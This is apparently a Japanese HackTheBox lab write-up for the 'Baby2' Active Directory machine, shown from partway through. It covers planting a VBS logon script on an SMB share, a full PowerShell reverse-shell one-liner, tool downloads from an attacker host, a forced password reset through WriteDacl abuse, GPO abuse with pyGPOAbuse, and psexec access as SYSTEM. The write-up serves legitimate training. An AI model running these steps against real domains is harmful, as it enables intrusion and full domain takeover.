smb: \baby2.vl\scripts\> ls
  .                                   D        0  Tue Oct  7 12:27:10 2025
  ..                                  D        0  Tue Aug 22 17:43:55 2023
  generate.lnk                        A     2164  Tue Oct  7 12:27:11 2025
  login.vbs                           A      992  Sat Sep  2 14:55:51 2023

                6126847 blocks of size 4096. 1949731 blocks available
smb: \baby2.vl\scripts\> put login.vbs
putting file login.vbs as \baby2.vl\scripts\login.vbs (23.5 kb/s) (average 23.5 kb/s)
smb: \baby2.vl\scripts\> ls
  .                                   D        0  Tue Oct  7 12:27:10 2025
  ..                                  D        0  Tue Aug 22 17:43:55 2023
  generate.lnk                        A     2164  Tue Oct  7 12:27:11 2025
  login.vbs                           A    13608  Tue Oct  7 12:53:13 2025

```

```sh
┌──(kali㉿kali)-[~/Desktop/HTB/BabyTwo/revbshell]
└─$ python2 server.py 
> dir
> DIR 
Unknown command
help
> Supported commands:
- CD [directory]     - Change directory. Shows current directory when without parameter.
- DOWNLOAD [path]    - Download the file at [path] to the .\Downloads folder.
- GETUID             - Get shell user id.
- GETWD              - Get working directory. Same as CD.
- HELP               - Show this help.
- IFCONFIG           - Show network configuration.
- KILL               - Stop script on the remote host.
- PS                 - Show process list.
- PWD                - Same as GETWD and CD.
- SET [name] [value] - Set a variable, for example SET LHOST 192.168.1.77.
                       When entered without parameters, it shows the currently set variables.
- SHELL [command]    - Execute command in cmd.exe interpreter;
                       When entered without command, switches to SHELL context.
- SHUTDOWN           - Exit this commandline interface (does not shutdown the client).
- SYSINFO            - Show sytem information.
- SLEEP [ms]         - Set client polling interval;
                       When entered without ms, shows the current interval.
- UNSET [name]       - Unset a variable
- UPLOAD [localpath] - Upload the file at [path] to the remote host.
                       Note: Variable LHOST is required.
- WGET [url]         - Download file from url.

> PWD
> PWD 
.
SHELL dir
> > SHELL dir
 Volume in drive C has no label.
 Volume Serial Number is E6F3-2485

 Directory of C:\Windows\system32

10/07/2025  01:25 AM    <DIR>          .
08/20/2025  09:05 AM    <DIR>          ..
05/08/2021  02:35 AM    <DIR>          0409
05/08/2021  01:14 AM            24,904 0ae3b998-9a38-4b72-a4c4-06849441518d_Servicing-Stack.dll
05/08/2021  01:14 AM            24,888 69fe178f-26e7-43a9-aa7d-2b616b672dde_eventlogservice.dll
04/16/2025  02:16 AM            26,080 6bea57fb-8dfb-4177-9ae8-42e8b3529933_RuntimeDeviceInstall.dll
05/08/2021  01:14 AM             3,176 @AdvancedKeySettingsNotification.png
05/08/2021  01:14 AM               232 @AppHelpToast.png

```

C:\を見る
```sh
> > SHELL dir C:\
 Volume in drive C has no label.
 Volume Serial Number is E6F3-2485

 Directory of C:\

04/16/2025  02:27 AM    <DIR>          inetpub
05/08/2021  01:20 AM    <DIR>          PerfLogs
04/16/2025  01:51 AM    <DIR>          Program Files
08/22/2023  10:30 AM    <DIR>          Program Files (x86)
08/22/2023  01:10 PM    <DIR>          shares
08/22/2023  12:35 PM    <DIR>          temp
04/16/2025  02:48 AM                32 user.txt
08/22/2023  12:54 PM    <DIR>          Users
08/20/2025  09:05 AM    <DIR>          Windows
               1 File(s)             32 bytes
               8 Dir(s)   7,984,095,232 bytes free


```
userフラグがある

userフラグを取得できた
```sh
SHELL type C:\user.txt
> > SHELL type C:\user.txt
```

正直、これだとやりにくいので、SHELL関数を使って、リバースシェルを立てる

revbshellのserver.pyの中で以下のコマンドを実行する
```sh
> PWD    
> PWD 
.
SHELL powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.16.15',9000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

```

リバースシェルを待ち受ける
```sh
rlwrap nc -lvnp 8888
listening on [any] 8888 ...
connect to [10.10.16.15] from (UNKNOWN) [10.129.234.72] 64759

PS C:\Windows\system32> 
```
確立できた





# Lateral Movement

現状を確認
アカウント
```bash
PS C:\> whoami /all

USER INFORMATION
----------------

User Name              SID                                          
====================== =============================================
baby2\amelia.griffiths S-1-5-21-213243958-1766259620-4276976267-1114


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes                                        
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Group used for deny only                          
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
BABY2\office                               Group            S-1-5-21-213243958-1766259620-4276976267-1104 Mandatory group, Enabled by default, Enabled group
BABY2\legacy                               Group            S-1-5-21-213243958-1766259620-4276976267-2601 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                                                     


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.

```
amelia.griffithsでログインできた
BABY2\legacy・BABY2\officeに入っていることがわかる

bloodhoundで確認する
![](https://i.imgur.com/7Z2Rooc.png)
DC.BABY2.VLに対して、RDPできる
でも、現状RDPするためのamelia.griffithsの認証情報を得ていない

Group Delegated Object Controlを見てみる
![](https://i.imgur.com/xQUY7lu.png)
と、LEGACYグループ経由でGPOADMユーザーに対して、WriteDaclとWriteOwner権限を持っていることがわかる

BloodHoundのWriteDaclのInfo
- グループ[LEGACY@BABY2.VL](mailto:LEGACY@BABY2.VL)のメンバーは、ユーザー[GPOADM@BABY2.VL](mailto:GPOADM@BABY2.VL)のDACL(任意アクセス制御リスト)を変更する権限を持っています。
- 対象オブジェクトのDACLへの書き込みアクセス権があれば、そのオブジェクトに対して自分自身に任意の権限を付与することができます。

BloodHoundのWriteOwnerのInfo
- グループ[LEGACY@BABY2.VL](mailto:LEGACY@BABY2.VL)のメンバーは、ユーザー[GPOADM@BABY2.VL](mailto:GPOADM@BABY2.VL)の所有者を変更する能力を持っています。
- オブジェクトの所有者は、オブジェクトのDACLに設定されている権限に関係なく、オブジェクトのセキュリティ記述子を変更する能力を保持しています。
  

で、GPOADMは何ができるかをBloodHoundで見る
![](https://i.imgur.com/GwNewAR.png)
DEFAULT DOMAIN POLICYにGeneric All権限を持ってる
ということは、DEFAULT DOMAIN POLICYはドメイン内のすべてのコンピュータとユーザーに適用されるため、ポリシーを変更してドメイン全体を制御できる。具体的には、即座にログインスクリプトを追加して、ドメイン管理者権限でコマンドを実行させることが可能ということ

windows Abuseを見ると、PowerViewを使う必要があるとのこと
```sh
$url = 'http://10.10.16.15:8888/PowerView.ps1'
$dest = 'C:\Users\Amelia.Griffiths\Desktop\PowerView.ps1'
(New-Object System.Net.WebClient).DownloadFile($url, $dest)
Test-Path $dest
```

PowerView.ps1をダウンロード・インポート
```sh
PS C:\Users\Amelia.Griffiths\Desktop> ls


    Directory: C:\Users\Amelia.Griffiths\Desktop


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         10/8/2025   2:48 AM         770279 PowerView.ps1   
PS C:\Users\Amelia.Griffiths\Desktop> . .\PowerView.ps1
```

GPOADMのパスワードを強制変更する

自分自身にGenericAll権限を付与
```
PS C:\Windows\system32> Add-DomainObjectAcl -TargetIdentity GPOADM -PrincipalIdentity AMELIA.GRIFFITHS -Rights All
```

GPOADMのパスワードを「SuperPass123!」に変更
```PS
PS C:\Windows\system32> PS C:\Windows\system32> $NewPassword = ConvertTo-SecureString 'SuperPass123!' -AsPlainText -Force
PS C:\Windows\system32> Set-DomainUserPassword -Identity GPOADM -AccountPassword $NewPassword
```

RunasCs.exeを使って、GPOADMにアカウントを切り返る
ファイルを送る
```sh
$url = 'http://10.10.16.15:8888/RunasCs.exe'
$dest = 'C:\Users\Amelia.Griffiths\Desktop\RunasCs.exe'
(New-Object System.Net.WebClient).DownloadFile($url, $dest)
Test-Path $dest
```

RunasCs.exeはログオンタイプが違うとのことで、ログインできない
```bash
PS C:\Windows\system32> cd C:\Users\Amelia.Griffiths\Desktop
PS C:\Users\Amelia.Griffiths\Desktop> .\RunasCs.exe GPOADM 'SuperPass123!' "cmd /c whoami"
[-] RunasCsException: Selected logon type '2' is not granted to the user 'GPOADM'. Use available logon type '3'.
PS C:\Users\Amelia.Griffiths\Desktop> .\RunasCs.exe GPOADM 'SuperPass123!' "cmd /c whoami" -l 3
[*] Warning: User profile directory for user GPOADM does not exists. Use --force-profile if you want to force the creation.
[*] Warning: The function CreateProcessWithLogonW is not compatible with the requested logon type '3'. Reverting to the Interactive logon type '2'. To force a specific logon type, use the flag combination --remote-impersonation and --logon-type.                                                                                                                                                                                                                                   
[-] RunasCsException: Selected logon type '2' is not granted to the user 'GPOADM'. Use available logon type '3'.                                                                                                                            
PS C:\Users\Amelia.Griffiths\Desktop> .\RunasCs.exe GPOADM 'SuperPass123!' "cmd /c whoami" --remote-impersonation -l 3

No output received from the process.
```
その後もログインタイプを9にしたりしたが、成功しない

RDP権限をGPOADMにつける
```bash
PS C:\Users\Amelia.Griffiths\Desktop> net localgroup "Remote Desktop Users" GPOADM /add
```

本当についているのか確認
```bash
PS C:\Users\Amelia.Griffiths\Desktop> net user GPOADM /domain
User name                    gpoadm
Full Name                    gpoadm                                                                                                                                                                                                         
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/8/2025 4:34:14 AM
Password expires             Never
Password changeable          10/9/2025 4:34:14 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   10/8/2025 4:39:21 AM

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Domain Users         
The command completed successfully.

```
パスワードは変更できているが、RDPはついていない、


Get-DomainGPOの実行
```
PS C:\Users\Amelia.Griffiths\Desktop> Get-DomainGPO


usncreated               : 5672
systemflags              : -1946157056
displayname              : Default Domain Policy
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}][{827D319E-6EA
                           C-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}][{B1BE8D72-6EAC-11D2-A4EA-00
                           C04F79F83A}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}]
whenchanged              : 8/22/2023 8:22:12 PM
objectclass              : {top, container, groupPolicyContainer}
gpcfunctionalityversion  : 2
showinadvancedviewonly   : True
usnchanged               : 24751
dscorepropagationdata    : {8/22/2023 7:16:28 PM, 8/22/2023 5:38:16 PM, 1/1/1601 12:00:00 AM}
name                     : {31B2F340-016D-11D2-945F-00C04FB984F9}
flags                    : 0
cn                       : {31B2F340-016D-11D2-945F-00C04FB984F9}
iscriticalsystemobject   : True
gpcfilesyspath           : \\baby2.vl\sysvol\baby2.vl\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
distinguishedname        : CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=baby2,DC=vl
whencreated              : 8/22/2023 5:37:41 PM
versionnumber            : 30
instancetype             : 4
objectguid               : 16398b5e-3bc4-4cd2-a9cb-33b690e6a6ad
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=baby2,DC=vl

usncreated               : 5675
systemflags              : -1946157056
displayname              : Default Domain Controllers Policy
gpcmachineextensionnames : [{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged              : 8/22/2023 8:51:56 PM
objectclass              : {top, container, groupPolicyContainer}
gpcfunctionalityversion  : 2
showinadvancedviewonly   : True
usnchanged               : 28701
dscorepropagationdata    : {8/22/2023 7:16:43 PM, 8/22/2023 5:38:16 PM, 1/1/1601 12:00:00 AM}
name                     : {6AC1786C-016F-11D2-945F-00C04fB984F9}
flags                    : 0
cn                       : {6AC1786C-016F-11D2-945F-00C04fB984F9}
iscriticalsystemobject   : True
gpcfilesyspath           : \\baby2.vl\sysvol\baby2.vl\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}
distinguishedname        : CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=baby2,DC=vl
whencreated              : 8/22/2023 5:37:41 PM
versionnumber            : 2
instancetype             : 4
objectguid               : 53a1476f-2330-45c6-b1c0-5d793d76ef1b
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=baby2,DC=vl

```
ドメイン内に2つのGPOがあることがわかる
Default Domain Policyは、ドメイン全体のすべてのコンピュータとユーザーのポリシーだから、これに対して、GPOADMがGenericAll権限があるってことは、GPOADM自身を管理者グループに入れることができてしまうということ

# Privilege Escalation
## GPOADMの権限昇格
パスワードを強制変更したGPOADMは何ができるかをBloodHoundで見る
![](https://i.imgur.com/GwNewAR.png)
DEFAULT DOMAIN POLICYにGeneric All権限を持ってる
Default Domain Policyは、ドメイン全体のすべてのコンピュータとユーザーのポリシーだから、これに対して、GPOADMがGenericAll権限があるってことは、GPOADM自身を管理者グループに入れることができてしまうということ

DEFAULT DOMAIN POLICYに対するGenericALLのLinuxAbuse翻訳コピペ
- GPO のフルコントロール権限を持っている場合、その GPO を自由に編集でき、その変更は GPO の適用対象となるユーザーやコンピューターに反映されます。
- 悪意のあるポリシーを適用したいターゲットオブジェクトを選択し、**gpedit の GUI を使って GPO を編集**します。
- このとき、アイテムレベルのターゲティングが可能な「悪意あるポリシー」（たとえば即時スケジュールタスクの追加など）を設定します。
- その後、**グループポリシークライアントが新しいポリシーを取得・実行するまで少なくとも 2 時間待ちます**。
- この手法の詳細な解説については、参考文献タブを参照してください。
- この目的には **pyGPOAbuse.py** を使用することも可能です。

### pyGPOAbuse.py
ダウンロード
```sh
git clone https://github.com/Hackndo/pyGPOAbuse
pip install -r requirements.txt
```

GPOADMを管理者グループに追加する
- 「31B2F340-016D-11D2-945F-00C04FB984F9」は、Default Domain PolicyのGUID
```sh
┌──(venv)─(kali㉿kali)-[~/Desktop/HTB/BabyTwo/pyGPOAbuse]
└─$ python pygpoabuse.py baby2.vl/GPOADM:SuperPass123! -gpo-id 31B2F340-016D-11D2-945F-00C04FB984F9 -command 'net localgroup administrators GPOADM /add' -f
[+] ScheduledTask TASK_c0847a16 created!

```

GPOを強制適用 & 管理者グループを確認
```sh
PS C:\Users\Amelia.Griffiths\Desktop> gpupdate /force
Updating policy...



Computer Policy update has completed successfully.



The following warnings were encountered during computer policy processing:



Windows could not record  the Resultant Set of Policy (RSoP) information for the Group Policy extension <Security>. Group Policy settings successfully applied to the computer or user; however, management tools may not report accurately.

User Policy update has completed successfully.


For more detailed information, review the event log or run GPRESULT /H GPReport.html from the command line to access information about Group Policy results.



PS C:\Users\Amelia.Griffiths\Desktop> net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
gpoadm

```
管理者グループにgpoadmが追加されてる!!

psexec.pyで接続して、root.txtを取得する
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/BabyTwo]
└─$ impacket-psexec baby2.vl/GPOADM:'SuperPass123!'@10.129.234.72 cmd.exe
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.234.72.....
[*] Found writable share ADMIN$
[*] Uploading file IyOhQyTJ.exe
[*] Opening SVCManager on 10.129.234.72.....
[*] Creating service aLtt on 10.129.234.72.....
[*] Starting service aLtt.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.4052]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> cd C:\Users\Administrator\Desktop             
 
C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is E6F3-2485

 Directory of C:\Users\Administrator\Desktop

08/21/2025  03:02 AM    <DIR>          .
08/22/2023  10:08 AM    <DIR>          ..
04/16/2025  02:47 AM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)   8,019,820,544 bytes free

C:\Users\Administrator\Desktop> type root.txt
<SNIP>
```
root.txtを取得できた


## Notes
- ユーザー名とパスワードが同じということもある
- smbmapとかnetexecでread onlyとなっていても、その配下のフォルダは書き込めることがある
	- その配下のフォルダが書き込めないというわけではないので、確認必須
- vbsからpowershellは実行できる
- bloodhoundのWindows Abuseは掌握したユーザーのパスワードが分からなくても実行できることがある
	- 意外と大事